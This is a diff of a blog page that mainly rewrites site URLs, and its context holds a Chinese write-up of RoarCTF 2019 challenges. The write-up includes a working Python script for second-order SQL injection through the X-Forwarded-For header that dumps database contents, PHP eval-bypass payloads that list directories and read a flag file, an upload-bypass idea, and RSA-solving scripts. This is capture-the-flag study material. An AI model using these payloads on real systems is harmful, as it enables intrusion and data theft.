@@ -30,16 +30,16 @@ die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($l
 解法:
 先用1&#39;|1|&#39;1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得猜&hellip;&hellip;在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到">
 <meta name="author" content="ch3n9w">
-<link rel="canonical" href="http://blog.dragonbox.top/posts/ctf-roarctfwp/">
+<link rel="canonical" href="http://dragonbox.top/posts/ctf-roarctfwp/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://blog.dragonbox.top/flash.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://blog.dragonbox.top/flash.ico">
-<link rel="icon" type="image/png" sizes="32x32" href="http://blog.dragonbox.top/flash.ico">
-<link rel="apple-touch-icon" href="http://blog.dragonbox.top/flash.ico">
-<link rel="mask-icon" href="http://blog.dragonbox.top/flash.ico">
+<link rel="icon" href="http://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="http://dragonbox.top/flash.ico">
+<link rel="apple-touch-icon" href="http://dragonbox.top/flash.ico">
+<link rel="mask-icon" href="http://dragonbox.top/flash.ico">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://blog.dragonbox.top/posts/ctf-roarctfwp/">
+<link rel="alternate" hreflang="en" href="http://dragonbox.top/posts/ctf-roarctfwp/">
 <noscript>
     <style>
         #theme-toggle,
@@ -100,13 +100,13 @@ die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($l
 解法:
 先用1&#39;|1|&#39;1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得猜&hellip;&hellip;在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://blog.dragonbox.top/posts/ctf-roarctfwp/" />
-<meta property="og:image" content="http://blog.dragonbox.top/image-20211114142019085.png" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://dragonbox.top/posts/ctf-roarctfwp/" />
+<meta property="og:image" content="http://dragonbox.top/image-20211114142019085.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2019-10-22T08:32:09+00:00" />
 <meta property="article:modified_time" content="2019-10-22T08:32:09+00:00" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="http://blog.dragonbox.top/image-20211114142019085.png" />
+<meta name="twitter:image" content="http://dragonbox.top/image-20211114142019085.png" />
 <meta name="twitter:title" content="RoarCTF 2019复现"/>
 <meta name="twitter:description" content="web
 online_proxy
@@ -141,13 +141,13 @@ die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($l
       "@type": "ListItem",
       "position":  1 ,
       "name": "Posts",
-      "item": "http://blog.dragonbox.top/posts/"
+      "item": "http://dragonbox.top/posts/"
     }, 
     {
       "@type": "ListItem",
       "position":  2 ,
       "name": "RoarCTF 2019复现",
-      "item": "http://blog.dragonbox.top/posts/ctf-roarctfwp/"
+      "item": "http://dragonbox.top/posts/ctf-roarctfwp/"
     }
   ]
 }
@@ -165,7 +165,7 @@ die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($l
   "articleBody": "web online_proxy 特征: 第一次登录后源代码内容有如下:\n换一个X-Forwarded-For 后会发现currentip是根据xff判别的\n那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了\n$result = query(\"select current_ip, last_ip from ip_log where uuid = '\".addslashes($uuid).\"'\"); if(count($result) \u003e 0) { if($ip !== $result[0]['current_ip']) { $last_ip = $result[0]['current_ip']; query(\"delete from ip_log where uuid='\".addslashes($uuid).\"'\"); } else { $last_ip = $result[0]['last_ip']; } } query(\"insert into ip_log values ('\".addslashes($uuid).\"', '\".addslashes($ip).\"', '$last_ip');\"); die(\"\\n\"); 解法:\n先用1'|1|'1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得猜……在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到\n成功执行了.\n搬运赵师傅的脚本学习学习\n#!/usr/bin/env python3 import requests target = \"http://localhost:8302/\" def execute_sql(sql): print(\"[*]请求语句：\" + sql) return_result = \"\" payload = \"0'|length((\" + sql + \"))|'0\" session = requests.session() r = session.get(target, headers={'X-Forwarded-For': payload}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) start_pos = r.text.find(\"Last Ip: \") end_pos = r.text.find(\" --\u003e\", start_pos) length = int(r.text[start_pos + 9: end_pos]) print(\"[+]长度：\" + str(length)) for i in range(1, length + 1, 5): payload = \"0'|conv(hex(substr((\" + sql + \"),\" + str(i) + \",5)),16,10)|'0\" r = session.get(target, headers={'X-Forwarded-For': payload}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) start_pos = r.text.find(\"Last Ip: \") end_pos = r.text.find(\" --\u003e\", start_pos) result = int(r.text[start_pos + 9: end_pos]) return_result += bytes.fromhex(hex(result)[2:]).decode('utf-8') print(\"[+]位置 \" + str(i) + \" 请求五位成功:\" + bytes.fromhex(hex(result)[2:]).decode('utf-8')) return return_result # 获取数据库 print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA\")) # 获取数据库表 print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'\")) # 获取数据库表 print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' \")) # 获取表中内容 print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e\")) 5555555\n在addslashes后插入数据在数据库中是这样的\n第二行是提取出来不经过addslashes重新插入的结果\neasy_calc https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\nhexdec(bin2hex('/')); ?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号 hexdec(bin2hex('/f1agg')); ?+num=file_get_contents(hex2bin(dechex(52115961636711))) 源码是这么执行语句的\n$str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(\"what are you want to do?\"); } } eval('echo '.$str.';'); Simple UPload \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index() { show_source(__FILE__); } public function upload() { $uploadFile = $_FILES['file'] ; if (strstr(strtolower($uploadFile['name']), \".php\") ) { return false; } $upload = new \\Think\\Upload();// 实例化上传类 $upload-\u003emaxSize = 4096 ;// 设置附件上传大小 $upload-\u003eallowExts = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型 $upload-\u003erootPath = './Public/Uploads/';// 设置附件上传目录 $upload-\u003esavePath = '';// 设置附件上传子目录 $info = $upload-\u003eupload() ; if(!$info) {// 上传错误提示错误信息 $this-\u003eerror($upload-\u003egetError()); return; }else{// 上传成功 获取上传文件信息 $url = __ROOT__.substr($upload-\u003erootPath,1).$info['file']['savepath'].$info['file']['savename'] ; echo json_encode(array(\"url\"=\u003e$url,\"success\"=\u003e1)); } } } 思路: 由于只对’file’文件做判断, 所以一旦上传多个文件就可以绕过,然后根据文件名的生成方式来爆破php文件位置.\ncrypto RSA 题目给出了条件\nn=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L e=0x10001 (((y%x)**5)%(x%y))**2019+y**316+(y+1)/x=2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724L p=gmpy2.next_prime(x*y*z) q=gmpy2.next_prime(z) c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L 因为\n2**(2019) \u003e 26833491826787145242474...1422L 所以\n((y%x)**5)%(x%y) = 1 或者 0 所以将这项忽略,再将(y+1)/x忽略\ny 约等于26833491826787145242474...1422L的316次方 y 约等于83 然后(y+1)/x 必须为整数 ,结合上述条件可以轻易求得x=2.y=83\n接下来\np = xyz + a q = z + b xyzz + xyzb + az + ab = n 忽略ab, az, xyzb, 求出z的近似值,然后这个值肯定比真实的z要大, 因此可以根据这个值循环减一带入运算来爆破p ,求出的p如果可以整除n就停下.\nimport gmpy2 from Crypto.Util import number n=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L e=0x10001 c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L # x=2 # y = 83 # z_close = gmpy2.iroot(n//166, 2) z_close = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458023 while True: p_close = gmpy2.next_prime(166*z_close) if n % p_close == 0: p = p_close q = n // p break z_close -= 1 # p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 # q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569 phi = (p-1) * (q-1) d = gmpy2.invert(e, phi) print number.long_to_bytes(pow(c,d,n)) babyrsa import sympy import random def myGetPrime(): A= getPrime(513) print(A) B=A-random.randint(1e3,1e5) print(B) return sympy.nextPrime((B!)%A) p=myGetPrime() #A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407 #B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596 q=myGetPrime() #A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927 #B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026 r=myGetPrime() n=p*q*r #n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733 c=pow(flag,e,n) #e=0x1001 #c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428 #so,what is the flag? 直接求b的阶乘是不可能的,递归达到最大限制次数也求不出来.\n这里要用到威尔逊定理\n判定一个数字是素数的充分必要条件:\n(p-1)! = -1 (mod p)\n在这套题中可以发现(-1)(A-1)(A-2)...(B+2)(B+1)是B! 关于A的逆元,然后就好求了\nimport gmpy2 import sympy from Crypto.Util import number def myprime(a, b): ans = 1 for i in range(b+1, a): ans = (ans *i) % a ans = -1 * ans num = gmpy2.invert(ans ,a) return sympy.nextprime(num) A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407 B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596 p = myprime(A1, B1) A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927 B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026 q = myprime(A2, B2) n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733 enc=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428 r = n /(p*q) e=0x1001 phi = (p-1)*(q-1)*(r-1) d = gmpy2.invert(e, phi) m = pow(enc, d, n) print number.long_to_bytes(m) ",
   "wordCount" : "611",
   "inLanguage": "en",
-  "image":"http://blog.dragonbox.top/image-20211114142019085.png","datePublished": "2019-10-22T08:32:09Z",
+  "image":"http://dragonbox.top/image-20211114142019085.png","datePublished": "2019-10-22T08:32:09Z",
   "dateModified": "2019-10-22T08:32:09Z",
   "author":{
     "@type": "Person",
@@ -173,14 +173,14 @@ die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($l
   },
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "http://blog.dragonbox.top/posts/ctf-roarctfwp/"
+    "@id": "http://dragonbox.top/posts/ctf-roarctfwp/"
   },
   "publisher": {
     "@type": "Organization",
     "name": "ch3n9w の 超元域",
     "logo": {
       "@type": "ImageObject",
-      "url": "http://blog.dragonbox.top/flash.ico"
+      "url": "http://dragonbox.top/flash.ico"
     }
   }
 }
@@ -202,8 +202,8 @@ die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($l
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://blog.dragonbox.top/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
-                <img src="http://blog.dragonbox.top/avatar.jpg" alt="" aria-label="logo"
+            <a href="http://dragonbox.top/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
+                <img src="http://dragonbox.top/avatar.jpg" alt="" aria-label="logo"
                     height="35">ch3n9w の 超元域</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
@@ -230,7 +230,7 @@ die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($l
         </div>
         <ul id="menu">
             <li>
-                <a href="http://blog.dragonbox.top/categories/" title="categories">
+                <a href="http://dragonbox.top/categories/" title="categories">
                     <span>categories</span>
                 </a>
             </li>
@@ -241,7 +241,7 @@ die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($l
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://blog.dragonbox.top/">Home</a>&nbsp;»&nbsp;<a href="http://blog.dragonbox.top/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="http://dragonbox.top/">Home</a>&nbsp;»&nbsp;<a href="http://dragonbox.top/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       RoarCTF 2019复现
     </h1>
@@ -250,8 +250,8 @@ die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($l
 </div>
   </header> 
 <figure class="entry-cover">
-        <img loading="eager" srcset="http://blog.dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu11205713685870468779.png 360w ,http://blog.dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu11251465444592969194.png 480w ,http://blog.dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085.png 693w" 
-            sizes="(min-width: 768px) 720px, 100vw" src="http://blog.dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085.png" alt="" 
+        <img loading="eager" srcset="http://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu11205713685870468779.png 360w ,http://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu11251465444592969194.png 480w ,http://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085.png 693w" 
+            sizes="(min-width: 768px) 720px, 100vw" src="http://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085.png" alt="" 
             width="693" height="347">
         
 </figure><div class="toc">
@@ -542,12 +542,12 @@ xyzz + xyzb + az + ab = n
     <ul class="post-tags">
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://blog.dragonbox.top/posts/ctf-qwb-copperstudy-record/">
+  <a class="prev" href="http://dragonbox.top/posts/ctf-qwb-copperstudy-record/">
     <span class="title">« Prev</span>
     <br>
     <span>copperstudy-record</span>
   </a>
-  <a class="next" href="http://blog.dragonbox.top/posts/ctf-bytectf2019/">
+  <a class="next" href="http://dragonbox.top/posts/ctf-bytectf2019/">
     <span class="title">Next »</span>
     <br>
     <span>bytectf2019</span>
@@ -559,7 +559,7 @@ xyzz + xyzb + az + ab = n
     </main>
     
 <footer class="footer">
-        <span>&copy; 2024 <a href="http://blog.dragonbox.top/">ch3n9w の 超元域</a></span> · 
+        <span>&copy; 2024 <a href="http://dragonbox.top/">ch3n9w の 超元域</a></span> · 
 
     <span>
         Powered by
